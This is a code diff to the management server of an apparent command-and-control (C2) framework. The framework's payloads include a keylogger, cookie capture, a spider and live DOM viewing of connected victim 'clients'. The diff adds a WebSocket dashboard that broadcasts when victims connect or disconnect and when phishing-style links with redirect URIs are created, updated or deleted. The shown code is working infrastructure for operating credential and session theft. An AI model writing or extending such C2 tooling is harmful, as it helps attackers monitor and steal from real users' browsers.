@@ -18,7 +18,7 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
  * @returns {{ app: import("express").Application, server: import("http").Server }}
  */
 export function createManagementServer(state, opts = {}) {
-  const { db, payloadHandlers, activeClients, logViewers, storeLog } = state;
+  const { db, payloadHandlers, activeClients, logViewers, storeLog, events } = state;
   const c2Server = opts.c2Server || null;
 
   const app = express();
@@ -41,6 +41,57 @@ export function createManagementServer(state, opts = {}) {
   // whether the payload is currently loaded on a live client or enabled in their config.
   const DB_BACKED_PAYLOADS = new Set(["spider", "keylogger", "cookies"]);
 
+  /**
+   * Dashboard viewer WebSocket subscriptions — receive live link/client change events.
+   * Set<{ ws: WebSocket }>
+   */
+  const dashboardViewers = new Set();
+
+  /**
+   * Enrich a DB client record with live runtime state (connected, activePayloads, hasData).
+   * Returns null if the client record no longer exists or the DB is closed (shutdown race).
+   * @param {string} clientId
+   */
+  function enrichClient(clientId) {
+    try {
+      const c = db.getClient(clientId);
+      if (!c) return null;
+      const active = activeClients.get(clientId);
+      return {
+        ...c,
+        connected: activeClients.has(clientId),
+        activePayloads: active ? Object.keys(active.payloads) : [],
+        hasData: db.getClientHasData(clientId),
+      };
+    } catch {
+      return null;
+    }
+  }
+
+  /**
+   * Broadcast a message to all open dashboard viewer WebSockets.
+   * @param {object} msg - JSON-serialisable message object.
+   */
+  function broadcastToDashboard(msg) {
+    const text = JSON.stringify(msg);
+    for (const viewer of dashboardViewers) {
+      if (viewer.ws.readyState === WS_OPEN) {
+        viewer.ws.send(text);
+      }
+    }
+  }
+
+  // Listen for client connect/disconnect events from the C2 server
+  events.on("client-connected", (clientId) => {
+    const client = enrichClient(clientId);
+    if (client) broadcastToDashboard({ type: "client-connected", client });
+  });
+
+  events.on("client-disconnected", (clientId) => {
+    const client = enrichClient(clientId);
+    if (client) broadcastToDashboard({ type: "client-disconnected", client });
+  });
+
   // Viewer WebSocket: dashboards and live-view pages subscribe here.
   // Payload viewer: /view?id=<clientId>&payload=<name>
   // Log viewer:     /view?payload=logs  or  /view?id=<clientId>&payload=logs
@@ -48,6 +99,26 @@ export function createManagementServer(state, opts = {}) {
     const url = new URL(req.url, `http://${req.headers.host}`);
     const clientId = url.searchParams.get("id");
     const payloadName = url.searchParams.get("payload") || "domviewer";
+
+    if (payloadName === "dashboard") {
+      const viewer = { ws };
+      dashboardViewers.add(viewer);
+
+      // Send initial snapshot of all links and clients
+      const initClients = db.getAllClients().map((c) => {
+        const active = activeClients.get(c.id);
+        return {
+          ...c,
+          connected: activeClients.has(c.id),
+          activePayloads: active ? Object.keys(active.payloads) : [],
+          hasData: db.getClientHasData(c.id),
+        };
+      });
+      ws.send(JSON.stringify({ type: "init", links: db.getAllLinks(), clients: initClients }));
+
+      ws.on("close", () => dashboardViewers.delete(viewer));
+      return;
+    }
 
     if (payloadName === "logs") {
       const viewer = { ws, clientId: clientId || null };
@@ -162,6 +233,8 @@ export function createManagementServer(state, opts = {}) {
     const config = req.body.config && typeof req.body.config === "object" ? req.body.config : {};
     const linkId = crypto.randomUUID();
     db.insertLink(linkId, payloads, redirectUri, config);
+    const link = db.getLink(linkId);
+    broadcastToDashboard({ type: "link-created", link });
     res.json({ id: linkId, payloads, redirectUri, config });
   });
 
@@ -191,6 +264,7 @@ export function createManagementServer(state, opts = {}) {
     }
 
     const updatedLink = db.getLink(linkId);
+    broadcastToDashboard({ type: "link-updated", link: updatedLink });
     res.json({ id: linkId, payloads: updatedLink?.payloads ?? [], config: updatedLink?.config || {} });
   });
 
@@ -200,7 +274,9 @@ export function createManagementServer(state, opts = {}) {
    * a client is independent of its originating link.
    */
   app.delete("/api/links/:id", requireLink(db), (req, res) => {
-    db.deleteLink(req.params.id);
+    const linkId = req.params.id;
+    db.deleteLink(linkId);
+    broadcastToDashboard({ type: "link-deleted", linkId });
     res.json({ ok: true });
   });
 
@@ -297,6 +373,8 @@ export function createManagementServer(state, opts = {}) {
       }
     }
 
+    const updatedClient = enrichClient(clientId);
+    if (updatedClient) broadcastToDashboard({ type: "client-updated", client: updatedClient });
     res.json({ id: clientId, payloads: newPayloads, config: newConfig });
   });
 
@@ -306,8 +384,10 @@ export function createManagementServer(state, opts = {}) {
    * Cascades to logs and spider results.
    */
   app.delete("/api/clients/:id", requireClient(db), (req, res) => {
-    state.destroyClient(req.params.id);
-    db.deleteClient(req.params.id);
+    const clientId = req.params.id;
+    state.destroyClient(clientId);
+    db.deleteClient(clientId);
+    broadcastToDashboard({ type: "client-deleted", clientId });
     res.json({ ok: true });
   });
 
